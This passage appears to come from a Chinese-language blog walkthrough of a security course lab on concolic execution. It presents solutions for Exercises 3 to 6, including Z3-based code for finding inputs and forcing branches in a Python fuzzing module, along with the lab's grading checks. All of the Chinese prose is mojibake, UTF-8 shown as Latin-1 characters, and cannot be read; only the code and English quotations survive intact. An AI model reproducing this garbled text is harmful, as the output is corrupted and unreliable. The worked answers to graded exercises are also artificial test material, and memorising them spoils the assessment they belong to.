ä¸­åˆ›å»ºçš„å­—å…¸å‘¢ï¼Ÿæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ Exercise 3 çš„è¯„åˆ¤æ ‡å‡†ï¼Œåœ¨ <code>check_lab3.py</code> ä¸­æ£€æµ‹çš„æ˜¯è¿è¡Œ <code>check-symex-int.py</code> åè¦è¾“å‡º <code>&quot;Found input for 1234&quot;</code> å­—ç¬¦ä¸²ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_symex_int</span>():<br>    sh(<span class="hljs-string">&#x27;python3 check-symex-int.py &gt;/tmp/lab3.log&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Found input for 1234&#x27;</span> <span class="hljs-keyword">in</span> file_read(<span class="hljs-string">&#x27;/tmp/lab3.log&#x27;</span>):<br>        log(green(<span class="hljs-string">&quot;PASS&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log(red(<span class="hljs-string">&quot;FAIL&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥ä¸‹æ¥æ¥çœ‹  <code>check-symex-int.py</code> ï¼Œå…¶å¼€å¤´çš„é€»è¾‘å¦‚ä¸‹ï¼Œ<code>r</code> çš„å€¼ä¸º 1234 å³å¯é€šè¿‡ Exercise 3ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This test case checks that you provided the right input in symex_exercises.</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calling f with a specific input..&#x27;</span>)<br>v = symex_exercises.make_a_test_case()<br>(r, constr, callers) = fuzzy.concolic_exec_input(test_f, v, verbose=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> r == <span class="hljs-number">1234</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found input for 1234&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input produced&quot;</span>, r, <span class="hljs-string">&quot;instead of 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>å¦‚å‰é¢æˆ‘ä»¬å¯¹ <code>concolic_exec_input()</code> çš„åˆ†æï¼Œ<code>r</code> çš„å€¼ç”±ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆå†³å®šï¼Œæ•…æˆ‘ä»¬æ¥çœ‹ <code>test_f()</code> çš„é€»è¾‘ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>mk_int()</code> ä»å…¨å±€å…·ä½“å€¼å­—å…¸ä¸­è·å– id ä¸º <code>i</code> çš„å€¼ä¼ å…¥ <code>f()</code> ä¸­è¿›è¡Œè¿ç®—ï¼Œè‹¥ä¸å­˜åœ¨ <code>i</code> åˆ™ <code>i</code> ä¼šè¢«é»˜è®¤èµ‹å€¼ <code>0</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == x+<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">2000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">80</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == <span class="hljs-number">1000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">30000</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">500</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">33</span><br>    <span class="hljs-keyword">if</span> x // <span class="hljs-number">123</span> == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1234</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">40</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    i = fuzzy.mk_int(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">0</span>)<br>    v = f(i)<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>ç”±å‡½æ•° <code>f()</code> æˆ‘ä»¬å¯ä»¥çŸ¥é“çš„æ˜¯æˆ‘ä»¬åªéœ€è¦å‘å…·ä½“å€¼å­—å…¸ä¸­æ·»åŠ ä¸€ä¸ª <code>i = 123 * 7</code> çš„å€¼å³å¯è®© <code>test_f()</code> è¿”å› <code>1234</code>ï¼Œæ•…ä¿®æ”¹ <code>symex_exercises.py</code> å¦‚ä¸‹ï¼Œè¿™é‡Œç”¨ <code>mk_int()</code> å’Œ <code>add()</code> éƒ½å¯ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  concrete_values.add(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">123</span> * <span class="hljs-number">7</span>)<br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 3ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/f3HsgQFum1CZDij.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 4ï¼Œå®Œæˆ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_find_input</code>  çš„å®ç°ï¼š</p><blockquote><p><strong>Exercise 4.</strong> Another major component in concolic execution is finding a concrete input for a constraint. Complete the implementation of <code>concolic_find_input</code> in <code>symex/fuzzy.py</code> and make sure you pass the second test case of <code>symex/check-symex-int.py</code>. For this exercise, you will have to invoke Z3, along the lines of <code>(ok, model) = fork_and_check(constr)</code> (see the comments in the code). Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>åœ¨è¯¥å‡½æ•°å½“ä¸­æˆ‘ä»¬éœ€è¦å®Œæˆå¯¹çº¦æŸçš„æ±‚è§£å¹¶è¿”å›å¯¹åº”çš„ç»“æœï¼Œå› æ­¤è¿™é‡Œéœ€è¦ä½¿ç”¨ Z3 æ±‚è§£å™¨æ¥å®Œæˆçº¦æŸæ±‚è§£è¿‡ç¨‹ï¼Œä¸è¿‡è¿™é‡Œå·²ç»å°†è°ƒç”¨ Z3 çš„æµç¨‹åœ¨ <code>fork_and_check()</code> ä¸­å®Œæˆå°è£…ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨è¯¥å‡½æ•°è¿›è¡Œæ±‚è§£å³å¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæ¥çœ‹  <code>fork_and_check()</code> çš„å…·ä½“å®ç°ï¼š</p><ul><li>åˆ›å»ºå­è¿›ç¨‹è°ƒç”¨ <code>fork_and_check_worker()</code> è¿›è¡Œçº¦æŸæ±‚è§£ï¼Œçˆ¶å­è¿›ç¨‹é€šè¿‡ç®¡é“é€šä¿¡</li><li>çˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹çš„ <code>SIGALRM</code> ä¿¡å·ï¼Œè‹¥ <code>z3_timeout</code> ç§’åæœªæ”¶åˆ°ï¼Œæ€æ­»å­è¿›ç¨‹</li><li>ä»ç®¡é“æ¥æ”¶ç»“æœå¹¶è¿”å›ï¼Œè‹¥è¶…æ—¶ï¼ˆå­è¿›ç¨‹è¢«æ€ï¼Œç®¡é“å…³é—­ï¼‰åˆ™è¿”å› <code>(z3.unknown, None)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Support for forking because z3 uses lots of global variables</span><br><br><span class="hljs-comment">## timeout for Z3, in seconds</span><br>z3_timeout = <span class="hljs-number">5</span><br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check</span>(<span class="hljs-params">constr</span>):<br>  constr = simplify(constr)<br><br>  parent_conn, child_conn = multiprocessing.Pipe()<br>  p = multiprocessing.Process(target=fork_and_check_worker,<br>                              args=(constr, child_conn))<br>  p.start()<br>  child_conn.close()<br><br>  <span class="hljs-comment">## timeout after a while..</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">sighandler</span>(<span class="hljs-params">signo, stack</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Timed out..&quot;</span>)<br>    <span class="hljs-comment"># print z3expr(constr).sexpr()</span><br>    p.terminate()<br><br>  signal.signal(signal.SIGALRM, sighandler)<br>  signal.alarm(z3_timeout)<br><br>  <span class="hljs-keyword">try</span>:<br>    res = parent_conn.recv()<br>  <span class="hljs-keyword">except</span> EOFError:<br>    res = (z3.unknown, <span class="hljs-literal">None</span>)<br>  <span class="hljs-keyword">finally</span>:<br>    signal.alarm(<span class="hljs-number">0</span>)<br><br>  p.join()<br>  <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹   <code>fork_and_check_workder()</code> çš„å…·ä½“å®ç°ï¼š</p><ul><li>æ–°å»ºä¸€ä¸ª Z3 æ±‚è§£å™¨å°†è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„çº¦æŸè¡¨è¾¾å¼ä¼ å…¥ï¼Œè°ƒç”¨ <code>Solver.check()</code> æ±‚è§£</li><li>è‹¥æ±‚è§£æˆåŠŸï¼Œè°ƒç”¨ <code>Solver.model()</code> è·å¾—æ±‚è§£ç»“æœ</li><li>åˆ¤æ–­ç»“æœä¸­å˜é‡ç±»å‹å¹¶è½¬æ¢ä¸ºæ•´å‹&#x2F;å­—ç¬¦ä¸²ï¼Œå¯¹äºå­—ç¬¦ä¸²åšé¢å¤–å¤„ç†ï¼Œå°†ç»“æœæ”¾åˆ°ä¸€ä¸ª <code>å­—ç¬¦ä¸²â†’ç»“æœ</code> æ˜ å°„çš„å­—å…¸ä¸­å¹¶è¿”å›</li></ul><blockquote><p>Z3 è¿™ç©æ„ç”¨èµ·æ¥ç¡®å®æ–¹ä¾¿ï¼Œä¸æ„§æ˜¯å¾®è½¯<del>å¤§çˆ¹</del></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check_worker</span>(<span class="hljs-params">constr, conn</span>):<br>  s = z3.Solver()<br>  s.add(z3expr(constr))<br>  ok = s.check()<br>  m = &#123;&#125;<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    z3m = s.model()<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> z3m:<br>      v = z3m[k]<br>      <span class="hljs-keyword">if</span> v.sort() == z3.IntSort():<br>        m[<span class="hljs-built_in">str</span>(k)] = v.as_long()<br>      <span class="hljs-keyword">elif</span> v.sort() == z3.StringSort():<br>        <span class="hljs-comment">## There doesn&#x27;t seem to be a way to get the raw string</span><br>        <span class="hljs-comment">## value out of Z3..  Instead, we get the escaped string</span><br>        <span class="hljs-comment">## value.  We need to jump through hoops to unescape it.</span><br>        x = v.as_string()<br>        u = x.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode-escape&#x27;</span>)<br>        m[<span class="hljs-built_in">str</span>(k)] = u<br>      <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Unknown sort for %s=%s: %s&quot;</span> % (k, v, v.sort()))<br>  conn.send((ok, m))<br>  conn.close()<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å¯ä»¥å®Œæˆ Exercise 4 äº†ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨  <code>fork_and_check()</code> è¿›è¡Œæ±‚è§£å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¿”å›çš„å­—å…¸ä¸­çš„é”®å€¼å¯¹åº”å½“åªåŒ…å« <code>ok_names</code> å‚æ•°ä¸­æ‰€éœ€è¦çš„é”®ï¼Œè‹¥ <code>ok_names == None</code> åˆ™å°†æ‰€æœ‰çš„é”®å€¼å¯¹æ·»åŠ åˆ°å­—å…¸ä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Given a constraint, ask Z3 to compute concrete values that make that</span><br><span class="hljs-comment"># constraint true. It returns a new ConcreteValues instance with those</span><br><span class="hljs-comment"># values.  Z3 produces variables that don&#x27;t show up in our</span><br><span class="hljs-comment"># applications and in our constraints; we filter those by accepting</span><br><span class="hljs-comment"># only variables names that appear in ok_names.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_find_input</span>(<span class="hljs-params">constraint, ok_names, verbose=<span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## Invoke Z3, along the lines of:</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">##     (ok, model) = fork_and_check(constr)</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## If Z3 was able to find example inputs that solve this</span><br>  <span class="hljs-comment">## constraint (i.e., ok == z3.sat), make a new input set</span><br>  <span class="hljs-comment">## containing the values from Z3&#x27;s model, and return it.</span><br>  (ok, model) = fork_and_check(constraint)<br>  cv = ConcreteValues()<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    sat = <span class="hljs-literal">True</span><br>    res_names = model.keys() <span class="hljs-keyword">if</span> ok_names <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> ok_names<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> res_names:<br>      cv.add(k, model[k])<br>  <span class="hljs-keyword">else</span>:<br>    sat = <span class="hljs-literal">False</span><br>  <span class="hljs-keyword">return</span> sat, cv<br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡ Exercise 4ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/NJ32G9ogzOCEbPA.png" alt="image.png"></p><p>ç„¶åæ˜¯ Exercise 5ï¼Œ å®Œæˆ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_force_branch</code>  çš„å®ç°ï¼š</p><blockquote><p>æå‰è¯´ä¸€ä¸‹ï¼Œè¿™ä¸ª Exercise 5 çš„æ£€æŸ¥<strong>éå¸¸æ¾</strong>ï¼Œä¸è¦ä»¥ä¸ºé€šè¿‡æ£€æŸ¥å°±æ˜¯çœŸçš„ Pass äº†ï¼Œæœ€å¥½è‡ªå·±å†çœ‹çœ‹ä»£ç é€»è¾‘æ˜¯å¦ç¬¦åˆè¦æ±‚â€¦</p></blockquote><blockquote><p><strong>Exercise 5.</strong> A final major component in concolic execution is exploring different branches of execution. Complete the implementation of <code>concolic_force_branch</code> in <code>symex/fuzzy.py</code> and make sure you pass the final test case of <code>symex/check-symex-int.py</code>. Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>æ­£å¦‚å‰æ–‡æ‰€è¯´ï¼Œåœ¨é‡åˆ°åˆ†æ”¯æ—¶æˆ‘ä»¬éœ€è¦<strong>é€†è½¬å½“å‰åˆ†æ”¯æ¡ä»¶ï¼Œä»¥æ¢ç´¢å¦ä¸€åˆ†æ”¯</strong>ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨å®é™…ä¸Šå°±æ˜¯é€†è½¬ <code>branch_conds</code> ä¸­çš„ç¬¬ <code>b</code> åˆ†æ”¯çš„æ¡ä»¶ï¼Œå¹¶è¿”å›æ–°çš„çº¦æŸæ¡ä»¶é›†åˆï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å–å‡ºè¯¥æ¡ä»¶å¹¶ä½¿ç”¨ <code>sym_not()</code> å–ååå†ç”¨ <code>sym_and()</code> åŠ ä¸Šè¯¥åˆ†æ”¯ä¹‹å‰æ‰€æœ‰çš„æ¡ä»¶çº¦æŸå³å¯</p><p>æ³¨æ„è¿™é‡Œçš„å‚æ•° <code>b</code> ä¸ºåˆ†æ”¯æ ‡å·ï¼Œ<code>branch_conds</code> ä¸ <code>branch_callers</code> ä¸ºåˆ†æ”¯çš„æ¡ä»¶ä¸è°ƒç”¨è€…æ•°ç»„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Compute a new constraint by negating the branch condition of the</span><br><span class="hljs-comment"># b-th branch in branch_conds. This constraint can be used to force</span><br><span class="hljs-comment"># the concolic execution to explore the other side of branch b.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_force_branch</span>(<span class="hljs-params">b, branch_conds, branch_callers, verbose = <span class="hljs-number">1</span></span>):<br>  <span class="hljs-comment">## Compute an AST expression for the constraints necessary</span><br>  <span class="hljs-comment">## to go the other way on branch b.  You can use existing</span><br>  <span class="hljs-comment">## logical AST combinators like sym_not(), sym_and(), etc.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Note that some of the AST combinators take separate positional</span><br>  <span class="hljs-comment">## arguments. In Python, to unpack a list into separate positional</span><br>  <span class="hljs-comment">## arguments, use the &#x27;*&#x27; operator documented at</span><br>  <span class="hljs-comment">## https://docs.python.org/3/tutorial/controlflow.html#unpacking-argument-lists</span><br><br>  constraint = <span class="hljs-literal">None</span><br>  <span class="hljs-comment">## Exercise 5 by arttnba3</span><br>  <span class="hljs-comment">### negating the branch condition of the b-th branch</span><br>  b_cond = branch_conds[b]<br>  <span class="hljs-keyword">if</span> (b_cond != const_bool(<span class="hljs-literal">True</span>)):<br>    constraint = sym_not(b_cond)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>      constraint = sym_and(constraint, branch_conds[i])<br>  <span class="hljs-comment">### end</span><br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">2</span>:<br>    callers = branch_callers[b]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying to branch at %s:%d:&#x27;</span> % (callers[<span class="hljs-number">0</span>], callers[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>      <span class="hljs-built_in">print</span>(indent(z3expr(constraint).sexpr()))<br><br>  <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> const_bool(<span class="hljs-literal">True</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> constraint<br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡ Exercise 5ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/dFbaOHEoCXG23L6.png" alt="image.png"></p><p>æœ€åæ˜¯ Exercise 6ï¼Œ <strong>ä½¿ç”¨æˆ‘ä»¬åœ¨ Exercise 3-5 ä¸­æ¶‰åŠçš„å‡ ä¸ªå‡½æ•°æ¥å®Œæˆ <code>concolic_execs()</code>â€”â€” å®Œæ•´çš„æ··åˆæ‰§è¡Œå‡½æ•°çš„æ„å»º</strong>ï¼Œæˆ‘ä»¬éœ€è¦å®Œæˆå¯¹ <code>func</code> ä¸­çš„<strong>æ¯ä¸€æ¡åˆ†æ”¯</strong>çš„æ‰§è¡Œï¼š</p><blockquote><p><strong>Exercise 6.</strong> Now implement concolic execution of a function in <code>concolic_execs()</code> in <code>symex/fuzzy.py</code>. The goal is to eventually cause every every branch of <code>func</code>to be executed. Read the comment for a proposed plan of attack for implementing that loop. The functions in the exercises 3-5 should be quite useful.</p><p>Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check that your <code>concolic_execs()</code> works correctly.</p><p>Beware that our check for this exercise is <em>not</em> complete. You may well find that later on something does not work, and you will have to revisit your code for this exercise.</p></blockquote><p>æˆ‘ä»¬å…ˆçœ‹ <code>concolic_execs()</code> ä¸­å·²æœ‰çš„é€»è¾‘æ¡†æ¶ï¼š</p><ul><li><code>checked</code> ä¸ºå·²ç»æ£€æŸ¥è¿‡çš„çº¦æŸï¼Œ<code>outs</code> ä¸ºæœ€åæ±‚è§£æ‰€å¾—ç»“æœï¼Œ<code>inputs</code> ä¸ºå¾…æµ‹è¯•è¾“å…¥é˜Ÿåˆ—ï¼ˆè¾“å…¥ä¸ºå…·ä½“å€¼å­—å…¸ï¼‰</li><li>ç”±ä¸€ä¸ªå¤§å¾ªç¯æŒç»­è°ƒç”¨<code>concolic_exec_input()</code> è®¡ç®—çº¦æŸ</li><li>å°†æ–°çš„çº¦æŸè§£æ·»åŠ åˆ°ç»“æœä¸­</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolic execute func for many different paths and return all</span><br><span class="hljs-comment"># computed results for those different paths.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_execs</span>(<span class="hljs-params">func, maxiter = <span class="hljs-number">100</span>, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## &quot;checked&quot; is the set of constraints we already sent to Z3 for</span><br>  <span class="hljs-comment">## checking.  use this to eliminate duplicate paths.</span><br>  checked = <span class="hljs-built_in">set</span>()<br><br>  <span class="hljs-comment">## output values</span><br>  outs = []<br><br>  <span class="hljs-comment">## list of inputs we should try to explore.</span><br>  inputs = InputQueue()<br><br>  <span class="hljs-built_in">iter</span> = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-built_in">iter</span> &lt; maxiter <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> inputs.empty():<br>    <span class="hljs-built_in">iter</span> += <span class="hljs-number">1</span><br>    concrete_values = inputs.get()<br>    (r, branch_conds, branch_callers) = concolic_exec_input(func, concrete_values, verbose)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> outs:<br>      outs.append(r)<br>    <br>    <span class="hljs-comment">## Exercise 6: your code here.</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ä»£ç éœ€è¦æ·»åŠ åœ¨å¤§å¾ªç¯çš„ååŠéƒ¨åˆ†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹åœ¨ Exercise 3-5 ä¸­æˆ‘ä»¬éƒ½è·å¾—äº†å“ªäº›å¯ç”¨å‡½æ•°ï¼š</p><ul><li><code>concolic_exec_input(testfunc, concrete_values, verbose = 0)</code>ï¼šå°† <code>concrete_values</code> å‚æ•°è®¾ä¸ºå…¨å±€å­—å…¸ï¼Œä¹‹åæ‰§è¡Œç»™å®šçš„å‡½æ•° <code>testfunc</code>ï¼Œè¿”å›æ‰§è¡Œçš„ç»“æœå€¼ã€åˆ†æ”¯æ¡ä»¶åˆ—è¡¨ã€åˆ†æ”¯è°ƒç”¨ä¿¡æ¯åˆ—è¡¨</li><li><code>concolic_find_input(constraint, ok_names, verbose=0)</code>ï¼šä½¿ç”¨ Z3 æ±‚è§£ç»™å®šçº¦æŸï¼Œè¿”å› <code>ok_names</code> åˆ—è¡¨ä¸­å˜é‡çš„å€¼</li><li><code>concolic_force_branch(b, branch_conds, branch_callers, verbose = 1)</code>ï¼šå¯¹ç»™å®šçº¦æŸæ¡ä»¶ <code>branch_conds</code> ä¸åˆ†æ”¯ <code>b</code>ï¼Œè¿”å›èµ°å‘è¯¥åˆ†æ”¯å¦ä¸€è·¯å¾„çš„çº¦æŸ</li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ Lab ç»™çš„æç¤ºä¿¡æ¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 6: your code here.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Here&#x27;s a possible plan of attack:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Iterate over the set of branches returned by concolic_exec_input.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_force_branch() to construct a constraint over</span><br><span class="hljs-comment">##   the inputs for taking the other side of that branch.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - If this constraint is already in the &quot;checked&quot; set, skip</span><br><span class="hljs-comment">##   it (otherwise, add it to prevent further duplicates).</span><br><span class="hljs-comment">##</span><br><span 